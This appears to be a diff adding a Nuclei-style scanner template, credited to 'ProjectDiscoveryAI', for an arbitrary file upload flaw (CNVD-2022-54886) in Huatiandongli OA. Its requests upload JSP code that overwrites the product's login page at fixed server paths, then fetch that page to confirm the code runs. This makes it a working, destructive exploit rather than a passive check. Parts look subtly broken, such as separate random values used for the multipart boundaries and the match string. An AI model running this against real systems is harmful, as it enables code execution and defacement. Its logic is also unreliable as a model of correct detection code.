@@ -1,0 +1,64 @@
+id: poc-huatiandongli-oa-anyfile-upload
+info:
+  name: 华天动力 OA 任意文件上传漏洞 (CNVD-2022-54886)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CNVD-2022-54886, file-upload
+http:
+  - raw:
+    - |
+      POST /OAapp/jsp/upload.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+      Content-Disposition: form-data; name="file"; filename="xxx.xml"
+      Content-Type: image/png
+
+      real path
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+      Content-Disposition: form-data; name="filename"
+
+      xxx.png
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "htoa"
+  - raw:
+    - |
+      POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+      Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+      Content-Type: image/png
+
+      <%out.print("{{rand_text_alphanumeric(12)}}");%>
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}
+      Content-Disposition: form-data; name="newFileName"
+
+      {{concat("E:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp", "\n", "D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp")}}
+      ------WebKitFormBoundary{{rand_text_alphanumeric(8)}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+    - |
+      GET /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp HTTP/1.1
+      Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, "{{rand_text_alphanumeric(12)}}")
